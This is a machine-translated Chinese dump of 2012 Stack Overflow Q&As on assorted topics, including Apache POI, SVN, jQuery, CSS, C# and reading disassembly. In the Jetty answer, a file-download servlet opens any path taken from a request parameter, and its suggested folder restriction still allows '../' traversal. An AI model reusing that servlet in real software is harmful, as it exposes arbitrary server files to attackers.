HSSFRow row = (HSSFRow) rows.next();
HSSFCell cellF1 = (HSSFCell) row.getCell(5);
if(cellF1.getCellType() == HSSFCell.CELL_TYPE_BLANK) {
  String val = "";
} 
```

我在 if 语句（空指针）中遇到错误，但只有当我使用它时，我才能检查：

```
 while (rows.hasNext()) {
    HSSFRow row = (HSSFRow) rows.next();
    java.util.Iterator<Cell> cells = row.cellIterator();
    while (cells.hasNext()) {
      HSSFCell cell = (HSSFCell) cells.next();
      if(cell.getCellType() == HSSFCell.CELL_TYPE_BLANK) {
        String emptytype = "";
        System.out.println("empty");
      }
    }
  } 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-22T23:37:52.620

这是 1 参数版本的正常行为`Row.getCell`。如果您查看 API 文档，它特别声明`getCell`如果未定义单元格将返回 null。许多 java 函数都表现出这种行为，因此在编码时考虑到这一点并没有错。因此，您的代码的一个版本可能类似于：

```
boolean hasDataFlag = true;    
HSSFRow row = sheet.getRow(rowNumber);
hasDataFlag = (row != null);
HSSFCell cell = null;
if (hasDataFlag) cell = row.getCell(cellNumber);
hasDataFlag = (cell != null);
if (hasDataFlag) hasDataFlag = (cell.getCellType() != Cell.CELL_TYPE_BLANK);
if (hasDataFlag) {
    // process the cell here
} 
```

或者，您可以使用其他版本的`Row.getCell`，它采用第二个参数指定缺少的单元格策略。此版本将允许您指定`getCell`为空白单元格返回空单元格。所以，这里有一些替代代码：

```
HSSFRow row = sheet.getRow(rowNumber);
if (row != null) {
    HSSFCell cell = row.getCell(cellNumber, Row.RETURN_BLANK_AS_NULL);
    if (cell != null) {
        // process cell here
    }
} 
```

或者，如果您愿意，可以将策略指定为`Row.CREATE_NULL_AS_BLANK`. 在这种情况下，您将替换`if (cell != null)`为`if (cell.getCellType() != Cell.CELL_TYPE_BLANK)`.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-22T16:27:10.157

如果您使用`CellIterator`，您将仅获得在某个时间点已定义的单元格（没有`null`单元格，但您将获得`blank`单元格）。如果要获取所有单元格，请按索引获取它们

按索引，您可以执行以下操作：

```
 Sheet sheet = workbook.getSheetAt(0);
 for (int rowNumber = sheet.getFirstRowNum(); rowNumber <= sheet.getLastRowNum(); rowNumber++) {
    Row row = sheet.getRow(rowNumber);
    if (row == null) {
         // This row is completely empty
    } else {
         // The row has data
         for (int cellNumber = row.getFirstCellNum(); cellNumber <= row.getLastCellNum(); cellNumber++) {
             Cell cell = row.getCell(cellNumber);
             if (cell == null || cell.getCellType() == Cell.CELL_TYPE_BLANK) {
                 // This cell is empty
             } else {
                 // This cell has data in it
             }
         }
    }
 } 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-02-19T09:37:27.573

```
Cell cell = row.getCell(x, Row.CREATE_NULL_AS_BLANK); 
```

这个技巧让我受益匪浅。看看对你有用吗...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-11-17T17:36:42.187

```
int column, rownumber = 0; // just for showing the example code

Row row = sheet1.getRow(rownumber); // just for showing the example code

if (row!= null)
    mycell = row.getCell(0);
if (mycell != null && mycell.getCellType() != Cell.CELL_TYPE_BLANK) {
    System.out.println(mycell.getStringCellValue());
}
else{
    System.out.println("whatever");  
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-06-17T06:55:17.970

公共字符串 getCellData(String File_Name,int Sheet_Num, int Row_Num, int Col_Num) 抛出 IOException{

```
 FileInputStream fileIn = new FileInputStream(System.getProperty("user.dir")+"\\"+File_Name+".xlsx");
    XSSFWorkbook workbook = new XSSFWorkbook(fileIn);
    XSSFSheet sheet=workbook.getSheetAt(Sheet_Num-1);
    XSSFRow row = sheet.getRow(Row_Num-1);
    XSSFCell cell= row.getCell(Col_Num-1);
    String celldata;
    if(cell!=null){
    celldata= cell.getStringCellValue();
    }
    else 
        celldata ="";
    fileIn.close();
    return celldata;

    } 
```

# svn - 有没有办法将 subversion 存储库的所有提交导入另一个存储库？

> ID：11155429
> 
> 赞同：0
> 
> 时间：2012-06-22T11:35:58.910
> 
> 标签：svn, version-control

我一直在我的本地机器上开发一个项目，并为它设置了一个本地颠覆存储库。到目前为止，它从我那里得到了 100 次提交。

但是很快，该项目将转移到在线托管的共享 Subversion 存储库中，我将来将从新的存储库中工作。

我想知道是否有办法将我的本地存储库转移到新的存储库，或者我的本地存储库从那时起基本上没用了？

共享仓库将托管在 beanstalkapp.com

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-22T11:38:55.930

您可以转储 SVN 存储库并将其导入新位置。
此处的 svnadmin 说明：[svnadmin 转储](http://www.visualsvn.com/support/svnbook/ref/svnadmin/c/dump/)

在此处导入 Beanstalk 说明：
[如何准备 SVN 转储以导入 BeanStalk](http://support.beanstalkapp.com/customer/portal/articles/68143-how-can-i-prepare-an-svn-dump-to-import-into-beanstalk-)
和此处：
[创建您的 subversion 存储库 - 选项 3：上传文件](http://support.beanstalkapp.com/customer/portal/articles/68118-creating-your-subversion-repository)

# javascript - 获取图形 api url

> ID：11155435
> 
> 赞同：0
> 
> 时间：2012-06-22T11:36:16.570
> 
> 标签：javascript, facebook

如何使用 FB JS SDK 检索 url 到图形 API？

在来源中，它在这里定义：[https ://github.com/facebook/facebook-js-sdk/blob/master/src/core/prelude.js#L86](https://github.com/facebook/facebook-js-sdk/blob/master/src/core/prelude.js#L86)

但是在运行时我无法找到如何获取该对象。他们使用一些棘手的命名空间技术，这有助于他们隐藏所有内部方法和属性；-)

PS：前一阵子可以检索，`FB._domain`但现在这个对象不存在了。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:03:18.133

你是对的，你曾经能够访问 sdk 的“私有”数据，但不再像最新的[官方博客文章](http://developers.facebook.com/blog/post/2012/06/20/platform-updates--operation-developer-love/)中解释的那样：

> **Javascript SDK 更新**
> 
> 正如 5 月宣布的那样，我们更新了 Javascript SDK 以限制公开暴露的接口。这是提高 SDK 可靠性的持续过程的一部分。我们删除了对所有内部属性和以 _ 为前缀的方法的访问权限。
> 
> 如果您当前依赖于访问内部属性，请重构它，以便您仅依赖于 [https://developers.facebook.com/docs/reference/javascript/](https://developers.facebook.com/docs/reference/javascript/)中列出的公开可用（和官方支持）的方法。
> 
> 请注意，所有未作为公共 API 的一部分列出的方法都可能会更改或删除，您不应直接使用它们。

图形 url 不应该让你担心，你可以把它当作一个常量，如果它给你带来麻烦，那么你可以将它作为一个静态属性，定义一次并在你的代码中使用它。

# google-drive-api - 通过 Google Drive API 将文件共享级别设置为“知道链接的任何人”

> ID：11155441
> 
> 赞同：7
> 
> 时间：2012-06-22T11:36:41.117
> 
> 标签：google-drive-api

怎么做？我应该改用 Google Docs ACL 吗？如何配置这样的 ACL？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-07-04T07:46:48.313

您必须设置以下参数：

```
private Permission insertPermission(Drive service, String fileId) throws Exception{
   Permission newPermission = new Permission();
   newPermission.setType("anyone");
   newPermission.setRole("reader");
   newPermission.setValue("");
   newPermission.setWithLink(true);
   return service.permissions().insert(fileId, newPermission).execute();
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-03T07:34:45.437

使用此方法使您的文件对任何人可见：

```
private static Permission insertPermission(Drive service, String fileId) throws IOException
{
    Permission newPermission = new Permission();
    newPermission.setType("anyone");
    newPermission.setRole("reader");

    return service.permissions().insert(fileId, newPermission).execute();
} 
```

更多细节[在这里](https://developers.google.com/drive/v2/reference/permissions/insert)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-22T20:23:14.650

您必须使用 Documents List API 来管理共享。[请在https://developers.google.com/google-apps/documents-list/#managing_sharing_permissions_of_resources_via_access_control_lists_acls](https://developers.google.com/google-apps/documents-list/#managing_sharing_permissions_of_resources_via_access_control_lists_acls)查看文档

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-11-08T17:02:44.890

对于 Google Drive API V3，使用此方法使您的文件对任何人可见：

```
 private Permission InsertAnyonePermissionToDownload(Google.Apis.Drive.v3.DriveService service, String fileId)
    {
        Permission newPermission = new Permission();
        newPermission.Type = "anyone";
        newPermission.Role = "reader";
        return service.Permissions.Create(newPermission, fileId).Execute();
    } 
```

# c# - [int,float,double] 中的 op_addition 在哪里

> ID：11155444
> 
> 赞同：7
> 
> 时间：2012-06-22T11:37:00.657
> 
> 标签：c#

虚拟代码：

```
public object Addition(object a, object b)
{
    var type = a.GetType();
    var op = type.GetMethod("op_Addition", BindingFlags.Static | BindingFlags.Public);
    return op.Invoke(null, new object[] { a, b });
} 
```

此方法抱怨 int/float/double，找不到这些方法（op_Addition）。

**那么如何构建一个通用的加法方法呢？**

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-22T11:39:46.647

是的，它们不是像这样的成员存在的自定义运算符 - 而是内置的 IL 指令。

（字符串连接*几乎*`string.Concat`也是如此，除了 C# 编译器构建对 . 的调用。）

如果您使用 C# 4 和 .NET 4，最简单的方法是使用动态类型：

```
public dynamic Addition(dynamic x, dynamic y)
{
    return x + y;
} 
```

对于早期版本，您需要对某些类型进行特殊处理:(

不清楚您的上下文是什么，但您可能会发现 Marc Gravell[关于泛型运算符的文章](http://www.yoda.arachsys.com/csharp/genericoperators.html)很有趣。

# winapi - 在装配体中定位变量位置

> ID：11155447
> 
> 赞同：0
> 
> 时间：2012-06-22T11:37:21.420
> 
> 标签：winapi, assembly, reverse-engineering

从下面的反汇编代码中，我可以假设该位置`43E010`是保存字符串的变量的位置（如汇编代码中的注释）：

**拆卸：**

```
...
push    offset loc_43E010
...
push    offset aAllYourBaseAre ; "all your base are belong to us"
...
.rdata:00446074 aAllYourBaseAre db 'all your base are belong to us',0 
```

这是来自 Win32 应用程序的反汇编代码，如下所示：

```
class Foo {
public: 
    string mystring;    
    __declspec(dllexport) void foo();
};

void Foo::foo(){

    printf("foo called");

}

int _tmain(int argc, _TCHAR* argv[])
{
    Foo foo;
    foo.mystring =  "all your base are belong to us";

    return 0;
} 
```

这条指令是否：`push offset loc_43E010`显示地址 43E010 是从 win32 可执行文件的基本映像的偏移量，并且它是一个变量位置？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-25T18:45:51.957

我会调用我的精神力量（嗨，雷蒙德！），然后我会疯狂地猜测你看到的是这样的东西：

```
push    ebp
mov     ebp, esp
push    0FFFFFFFFh
push    offset loc_43E010
mov     eax, large fs:0
push    eax
...
mov     large fs:0, eax 
```

这是使用异常处理的函数的典型序言。在您的情况下，即使没有 try/catch 语句，也有一个带有非平凡析构函数的局部变量，如果传播异常，则需要调用它。是函数异常处理程序的`loc_43E010`标签。

所以，答案是：不，它**不是**“可变位置”。

要了解有关 Win32（SEH 和 C++）中异常的更多信息，请查看[我的 OpenRCE 文章](https://www.openrce.org/articles/full_view/21)。

# java - Jetty：客户端文件下载

> ID：11155448
> 
> 赞同：0
> 
> 时间：2012-06-22T11:37:31.653
> 
> 标签：java, jetty, download, embedded-jetty

我有一个运行 Jetty 的 java 应用程序，并且包含几个 servlet 和一些 bean。整个事情是使用 .war 文件处理的。

架构已经很大了，我还没有处理它的所有概念，所以请原谅我的无知。

我想做的非常简单。我创建了一个指向 url 的新 servlet：filedl。

我只想在其中存储一个文件，客户端可以下载例如url：myapp/filedl/my_file.txt

我只需要某种目录列表，并且只允许访问这个目录。

稍后，我会考虑添加身份验证，但这是另一个问题。

这里的主要问题是我完全迷失了 Jetty 的所有概念，谷歌搜索 Jety 下载文件会返回大量愚蠢的结果。

任何方向将不胜感激！

谢谢。

**编辑：**

感谢#npe，我现在可以下载文件了。不过还有一件奇怪的事情：

*   我将 url-mapping 设置为 /filedl，但我可以从 / 下载文件。我只想在 /filedl 中允许 dl
*   无论我下载什么文件，它都被命名为filedl。
*   我无权访问文件列表（错误 500），即使我有

> ```
>  <init-param>
>      <param-name>dirAllowed</param-name>
>      <param-value>true</param-value>
>   </init-param> 
> ```

在我的战争文件中

知道这是从哪里来的吗？

再次感谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T12:32:31.603

它与 . 无关`Jetty`。

您要做的是创建一个`Servlet`提供静态文件的服务。

现在，要做到这一点，你需要实现这样的东西：

```
@WebServlet(name="myAwesomeServlet", urlPatterns={"/filedl"})
public class MyAwesomeServlet extends HttpServlet {

    public void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

        String fileName = (String) request.getParameter("file");
        FileInputStream fis = null;

        try {

            fis = new FileInputStream(fileName);
            response.setContentType("application/octet-stream"); 

            OutputStream out = response.getOutputStream();
            IOUtils.copy(fis, out); // this is using apache-commons, 
                                    // make sure you provide required JARs

        } finally {            

            IOUtils.closeQuietly(out);  // this is using apache-commons, 
            IOUtils.closeQuietly(fis);  // make sure you provide required JARs

        }

    }
} 
```

如果您不能使用`Servlet 3.0 API`，请去掉`@WebServlet`注释，并在`web.xml`.

然后像这样调用 URL：

```
http://your.awesome.server.com/filedl?file=path/to/file 
```

如果您希望 URL 更加 RESTful，如下所示：

```
http://your.awesome.server.com/filedl/file/path/to/file 
```

您需要对参数的解析方式进行一些更改。我会把它作为练习留给你。这种情况可能也是一个很好的将其实现为 REST 服务的案例（请参阅：[使用 JAX-RS 构建 RESTful Web 服务 - Java EE 6 教程](http://docs.oracle.com/javaee/6/tutorial/doc/giepu.html)）。

## 编辑

如果您想以某种方式将下载的文件限制在单个文件夹中，则需要自己实现。例如，您可以强制在特定文件夹中查找所有文件，如下所示：

```
String fileName = (String) request.getParameter("file");
File realFileName = new File("/my/restricted/folder", fileName);

...
fis = new FileInputStream(realFileName); 
```

这样，像`/fieldl/someFile.txt`fill 这样的 URL 会导致从`/my/restricted/folder/someFile.txt`.

# php - Mac上xampp上的Imagick：无法使用image.so

> ID：11155456
> 
> 赞同：1
> 
> 时间：2012-06-22T11:38:14.073
> 
> 标签：php, macos, apache, xampp, imagick

克服了安装 Image Magick 以及在 XAMPP 上安装和编译 imagick 的所有障碍（对我来说有一些障碍），我感觉我快到了，但我无法设法让扩展在 apache 中工作。

我做的最后一件事是：

*   使用 pecl 从 XAMPP 下载 imagick
*   解压它，编辑 config.m4 文件让它找到 Wand，`cd`进入文件夹的根目录，运行`phpize`，然后`./configure`，然后`make`，然后`sudo make install`，输出这个 `Installing shared extensions: /usr/lib/php/extensions/no-debug-non-zts-20090626/ Installing header files: /usr/include/php/`
*   然后将此 imagick.so 文件复制到`/Applications/XAMPP/xamppfiles/lib/php/php-5.3.1/extensions`
*   然后重新启动 Apache 以查看 imagick 似乎没有安装，因为它没有在 phpinfo 中提及

因此，在四处搜索之后，我还尝试将 imagick.so 复制到该`no-debug-non-zts-20090626`文件夹​​中，该文件夹也位于该`/Applications/XAMPP/xamppfiles/lib/php/php-5.3.1/extensions`文件夹中，并且我注意到其中有一些`.so`文件。

重新启动 Apache，输出 phpinfo() 中仍然没有 imagick 的迹象

然后我进一步搜索，发现一个教程提到必须编辑 php.ini 文件以了解扩展名。所以我`extension=imagick.so`在 php.ini 文件（位于`/Applications/XAMPP/xamppfiles/etc`）中的适当位置，就在`extension=imap.so`. 再次，重新启动 Apache，检查我的 phpinfo，没有 imagick。

我很沮丧，因为我觉得我离那里很近，但老实说，我真的不知道我必须知道什么。因此，我将非常感谢任何建议、帮助或想法，以及我下一步需要做什么。

干杯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-27T10:42:15.400

检查 PHP 错误日志，它可能需要比您的 apache 服务器使用的更高版本的 libfreetype.6。

如果是这样，您也许可以将 X11 正在使用的一个复制到 apache 目录。不要忘记备份您当前版本的 libfreetype.6

# jquery - 从带有回调返回值的函数返回（嵌套函数）？

> ID：11155462
> 
> 赞同：0
> 
> 时间：2012-06-22T11:38:23.697
> 
> 标签：jquery

```
$('form').submit(function() {
    $.post(url, $(this).serialize(), 'validate');
    return .....;
});

function validate(data) {
    return data;
} 
```

我需要从提交函数返回 validate() 提供的结果（数据）。我怎么做？如何让提交的返回等到ajax返回结果？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:14:03.587

是的，这个方法看起来很混乱。可能您应该在页面加载期间将变量初始化为 False，并在 validate 函数返回成功数据后将其设置为 true。它可以在这样的条件中设置：

```
$('form').submit(function(e) {
  if (!postflag) {
         e.preventDefault();
          $.post("foo.php",serialize(),function(data) {
                   if (validate(data)) {
                             postflag = true;
                    }
          });
        }  
    if (postflag) {
        $(this).submit();
     }          
     }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:43:09.693

你不能这样做，因为它是异步的。

你可以这样做：

```
$('form').submit(function(e) {
    var form = this;
    e.preventDefault(); //Prevent the form from submitting

    $.post(url, $(this).serialize(), function(data){
        if( validate( data ) ) {
            form.submit(); //Now submit the form. Please note `form` is not a jQuery object the event handler is not triggered.
        }
    });
}); 
```

# jquery - Chrome 中的 jQuery 事件调试

> ID：11155467
> 
> 赞同：6
> 
> 时间：2012-06-22T11:38:41.823
> 
> 标签：jquery, debugging, google-chrome

我们有一个非常 JS 密集型的 Web 应用程序，主要基于 jQuery 的[`live`](http://api.jquery.com/live/)绑定（事实上，我们从 jQuery v1.7 之前就一直在做这个）。

Chrome 的内置开发工具很棒，但是有一个问题一直在发生，我总是发现几乎不可能用它们进行调试：**有时我的`live`处理程序没有被调用，因为之前的处理程序停止了事件冒泡**。

有什么方法可以告诉 Chrome（或者实际上是 Firebug 或其他扩展程序或书签（最好是免费的！））**在 jQuery 库代码之外的下一个事件处理程序上中断**。这样我可以简单地单击按钮并查看触发的事件，单步执行并查看我何时意外停止传播？

如果没有，是否有充分的理由不这样做？这可以做到吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-27T04:26:19.877

您可能会发现这很有用：[http ://www.sprymedia.co.uk/article/Visual+Event+2](http://www.sprymedia.co.uk/article/Visual+Event+2)

> 称为 Visual Event 的 Javascript 小书签，它直观地显示页面上订阅了事件的元素、这些事件是什么以及事件在触发时将运行的功能......
> 
> 事实证明，W3C 推荐的 DOM 接口没有提供标准方法来找出哪些事件侦听器附加到特定节点......因此，我们不得不查看通常维护缓存的各个 Javascript 库附加事件（以便以后可以删除它们并执行其他有用的抽象）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-22T11:41:28.167

在 Chrome DevTools 中，您可以按事件类型设置断点：

[https://developers.google.com/chrome-developer-tools/docs/scripts-breakpoints#listeners](https://developers.google.com/chrome-developer-tools/docs/scripts-breakpoints#listeners)

不过，您不能排除 jQuery 事件。

顺便说一句，您应该使用[委托](http://api.jquery.com/delegate/)而不是 live()

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-10-10T10:15:12.847

除了 DG 响应，这是 Visual Event 的[Chrome 扩展](https://chrome.google.com/webstore/detail/visual-event/pbmmieigblcbldgdokdjpioljjninaim/related)。完美工作

# sql - 合并和聚合两个sql表

> ID：11155470
> 
> 赞同：0
> 
> 时间：2012-06-22T11:38:57.550
> 
> 标签：sql

我写了一条 sql 语句，das 返回作者、负面评论计数和正面评论计数。

示例输出：

迈克 3 4 丹尼尔 5 6 迈克 1 3

而且我想汇总 Mike，这样你就有了 Mike 4 7 的结果。我怎样才能将其作为 sql 查询来执行？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:39:58.343

```
select  Author
,       sum(NegativeComments) as SumNegative
,       sum(PositiveComments) as SumPositive
from    YourTable
group by
        Author 
```

# jquery - 通过 jquery 单击锚点时显示 div

> ID：11155471
> 
> 赞同：3
> 
> 时间：2012-06-22T11:39:06.180
> 
> 标签：jquery, css, jquery-animate

每当我单击锚点时，我都希望显示 div 弹出内容。但是使用此代码不会发生。

```
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"> 
<head> 
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>ZoomMap Example</title>

    <link rel="stylesheet" type="text/css" href="mymap.css" />
    <script type="text/javascript" src="jquery-1.3.2.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){
  $("#id1").click(function(){
  $(".popupcontent").animate({opacity:1.0});

});
});
</script>

</head>
<body>

<h1>Manana</h1>

        <div id="container">            

            <div id="map">

                <img src="images/map.png"/>

            <a class="pointer" id="id1" href="#" >a </a>
            <a class="pointer" id="id2" href="#" > </a>
            <a class="pointer" id="id3" href="#" > </a>
            <a class="pointer" id="id4" href="#" > </a>
            <a class="pointer" id="id5" href="#" > </a>

                <div class="popupcontent">
                             <p></p>
                        </div>

            </div>
        </div>

</body>
</html> 
```

该`css`文件包含以下代码。我已将此 div 的不透明度设为 0，以便它最初保持隐藏状态。当用户单击链接时，我已使用 animate 将不透明度更改为 1。但它仍然没有显示

```
 body{
margin:0;
padding:0;

}

#map{
dsplay:block;
margin:0;
padding:0;
width:600px;
height:300px;
position:absolute;
top:20%;
left:20%;

}

#map img{
margin:0;
padding:0;
width:600px;
height:300px;

z-index:1;

}
#map .pointer{
margin:0;
padding:0;
display: block;
 position: absolute; 
width: 5px; 
height: 5px; 
background: red; 
text-decoration: none; 
border: 1px solid red; 
opacity: .7;
z-index:2;
}

#map a.bullet {  z-index: 2; }

#map #id1{
left:123px;
top:40px;
}

#map #id2{
left:90px;
top:210px;
}

#map #id3{
left:225px;
top:20px;
}

#map #id4{
left:320px;
top:195px;
}

#map #id5{
left:425px;
top:20px;
}

#map .popupcontent{
background-color:yellow;
border-style:groove;
border-color:grey;
height:100px;
width:150px;
position:absolute;
top:30%;
left:30%;
opacity:0;
z-index:13;

}

#map .popupcontent p{

} 
```

我已将这些链接放在图像的顶部。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T12:26:53.327

试试这个，

首先将“popupcontent”的css设置为

```
display:none; 
```

**单击id1**时 ，将其 css 设置为`display:block;`

```
$(document).ready(function() {  
    $("#id1").click(function() {  
         $(".popupcontent").css('display', 'block');     
    });  
}); 
```

在此处查看演示
[http://jsfiddle.net/naresh3591/M5ahr/4/](http://jsfiddle.net/naresh3591/M5ahr/4/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:40:40.607

它工作正常，请参阅此演示：http: [//jsfiddle.net/rathoreahsan/M5ahr/2/](http://jsfiddle.net/rathoreahsan/M5ahr/2/)

但你也可以试试这个：

```
$(document).ready(function(){
  $("#id1").click(function(){
     $(".popupcontent").fadeTo('slow', '1.0');
  });
}); 
```

**演示：http:** [//jsfiddle.net/rathoreahsan/M5ahr/](http://jsfiddle.net/rathoreahsan/M5ahr/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T11:49:58.413

```
 $(document).ready(function(){
      $("#id1").click(function(){
          $(".popupcontent").fadeIn("fast");
      });
   }); 
```

或者

```
 $(document).ready(function(){
      $("#id1").click(function(){
          $(".popupcontent").show();
      });
   }); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T11:52:03.310

您可以使用淡入淡出功能

```
$(".popupcontent").fadeIn(); 
```

# css - 让一个 div 在 IE8 中有一个底部滚动条 - 尝试 2？

> ID：11155472
> 
> 赞同：0
> 
> 时间：2012-06-22T11:39:08.050
> 
> 标签：css, html, overflow

[这是我对这个问题](https://stackoverflow.com/questions/11154723/getting-a-div-to-have-a-bottom-scroll-bar-in-ie8)的第二次尝试。我把第一次尝试弄得一团糟，并要求将其删除。

所以，我基本上有很多`item`100 像素宽的小 div，我想要在一条水平线上（它们永远不能换行到下一行），包含在另一个 300 像素的 div 中`container`。

我需要`container`div 有一个水平滚动条，所以我可以左右滚动，而不允许较小的`item`div 换行到下面的行。

请记住，我不知道`item`最终结果将包含多少个 div，`container`因为它们将动态生成。

可以在 IE8 中执行此操作吗？

在这个[jsfiddle](http://jsfiddle.net/M2sgv/9/)示例中，唯一的问题似乎是`item`s 正在换行到下面的行。我认为如果它们停留在单条顶部水平线上，水平滚动条就会起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-22T11:53:00.047

而不是`float: left`，使用`display: inline-block`on `.item`。然后，添加`white-space: nowrap`以`.container`防止包装。

这适用于 IE7/8 和所有现代浏览器。

**见：http:** [//jsfiddle.net/thirtydot/M2sgv/22/](http://jsfiddle.net/thirtydot/M2sgv/22/)

```
.container {
    width: 300px;
    overflow-x: scroll;
    white-space: nowrap;
}

.item {
    width: 100px;
    display: inline-block;
    *display: inline; /* for ie7 */
    zoom: 1;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:01:57.077

这是解决方案[http://jsfiddle.net/M2sgv/21/](http://jsfiddle.net/M2sgv/21/)

刚刚添加了另一个固定宽度为“1200px”的容器，您可以选择任何宽度。其次，我添加了“溢出：自动；” 到容器div的css并删除溢出-x，溢出-y。并非所有浏览器都支持这两个，因此请避免使用它们。上述解决方案适用于所有浏览器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T12:06:35.843

您可以使用 JQuery 来实现这一点，这里是[Jsfiddle](http://jsfiddle.net/M2sgv/23/)

这是更新的代码：-

**jQuery代码： -**

```
$(document).ready(function(){
   var contWidth = $('.container .item').length * $('.container .item').width();
   $('.container').width(contWidth);    
});​ 
```

**HTML:-**

```
<div class="scrollContainer">
    <div class="container">    
        <div class="item">item 1</div>
        <div class="item">item 1</div>
        <div class="item">item 1</div>
        <div class="item">item 1</div>
        <div class="item">item 1</div>
        <div class="item">item 1</div>
        <div class="item">item 1</div>
        <div class="item">item 1</div>
        <div class="item">item 1</div>
        <div class="item">item 1</div>
    </div>
</div> 
```

​CSS **：-**

```
.scrollContainer 
{
    width: 500px;
    overflow: auto;
}
.item
{
    width:100px;
    float:left;
} 
```

编辑 **：-`scrollContainer`宽度可以根据您的要求任意。**

# jquery - 将鼠标悬停在 div上时的 jQuery mouseover mouseout 事件

> ID：11155473
> 
> 赞同：1
> 
> 时间：2012-06-22T11:39:17.110
> 
> 标签：jquery, mouseevent, onmouseout, ismouseover

我正在尝试使标题在缩略图上出现和消失。这是我的标题跨度：

```
<span class="thumbtitle"><?php the_title(); ?></span> 
```

这是在`<li>`带有“thumb”类的标签内。

我正在使用的 jQuery 是：

```
<script type='text/javascript'>
$(document).ready(function() {
  //settings
  var opacity = 0, toOpacity = 1, duration = 0;
  //set opacity ASAP and events
  $('.thumbtitle').css('opacity',opacity).hover(function() {
      $(this).fadeTo(duration,toOpacity);
    }, function() {
      $(this).fadeTo(duration,opacity);
    }
  );
});
</script> 
```

现在这工作得很好，但是当我将鼠标悬停在标题上时它工作......我希望它在我将鼠标悬停在缩略图上而不是标题所在的位置时触发，这样当鼠标移到缩略图上时（在它的任何地方) 标题出现。

有人可以帮我这样做吗？另外，我可以给它一个动画效果..让它逐渐出现和消失，而不是立即出现和消失吗？

米罗

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:43:43.657

这是更新的：-

```
<script type='text/javascript'>
   $(document).ready(function() {
   //settings
   var opacity = 0, toOpacity = 1, duration = 0;
   //set opacity ASAP and events
   $('li.thumb').hover(function() {
      $(this).children('.thumbtitle').fadeTo(duration,toOpacity);
    }, function() {
      $(this).children('.thumbtitle').fadeTo(duration,opacity);
    }
  );
});
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:14:42.713

根据您问题的标题，我认为您的 html 看起来像这样

```
This is the thumbnail:
<div class="thumbnail">
    <li class="thumb">
        <span class="thumbtitle">Title<span>
    </li>
</div> 
```

看一下这个：

[演示](http://jsfiddle.net/EJNCZ/)

```
$(document).ready(function() {

    // Start with no title visible.
    $('.thumb').hide();

    //settings
    var opacity = 0, toOpacity = 1, duration = 0;
    //set opacity ASAP and events

    $('.thumbnail').hover(function() {
        $(this).children('.thumb').fadeTo(duration , toOpacity );
    }, function() {
        $(this).children('.thumb').fadeTo(duration , opacity );
    });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T12:03:39.233

如果您不希望它在页面加载时显示，请将初始不透明度设置为 0，并在将鼠标悬停在...时将其设置为 1...

# android - 这个 ListAdapter 编辑文本有什么问题？

> ID：11155475
> 
> 赞同：1
> 
> 时间：2012-06-22T11:39:22.653
> 
> 标签：android, android-edittext

我想我在这里做一些非常基本的错误。我无法编辑由我的列表适配器生成的任何 editText 字段（正在显示文本框，我可以将光标放在字段上，但我无法键入/删除任何文本）。这是我的代码。

**我的 ListAdaptor** 公共类 LoanRepaymentListAdapter 扩展 ArrayAdapter {

```
private final List<CurrentRepaymentInstallment> loansForRepayment;
private final Activity context;

public LoanRepaymentListAdapter(Activity context, List<CurrentRepaymentInstallment> loansForRepayment) {
    super(context, R.layout.loan_repayments, loansForRepayment);
    this.context = context;
    this.loansForRepayment = loansForRepayment;
}

static class ViewHolder {
    protected TextView borrowerName;
    protected TextView loanAmount;
    protected TextView installmentNumber;
    protected TextView estimatedTotal;
    protected EditText repaymentAmount;
}

@Override
public View getView(final int position, View convertView, ViewGroup parent) {
    View view = null;
    if (convertView == null) {
        LayoutInflater inflator = context.getLayoutInflater();
        view = inflator.inflate(R.layout.loan_repayments, null);
        final ViewHolder viewHolder = new ViewHolder();
        viewHolder.borrowerName = (TextView) view.findViewById(R.id.borrowerName);
        viewHolder.loanAmount = (TextView) view.findViewById(R.id.loanAmount);
        viewHolder.installmentNumber = (TextView) view.findViewById(R.id.installmentNumber);
        viewHolder.estimatedTotal = (TextView) view.findViewById(R.id.estimatedTotal);
        viewHolder.repaymentAmount = (EditText) view.findViewById(R.id.repaymentAmount);
        viewHolder.repaymentAmount.setEditableFactory(Editable.Factory.getInstance());
        viewHolder.repaymentAmount.addTextChangedListener(new TextWatcher() {

            @Override
            public void afterTextChanged(Editable arg0) {
                String repaymentAmount = arg0.toString();
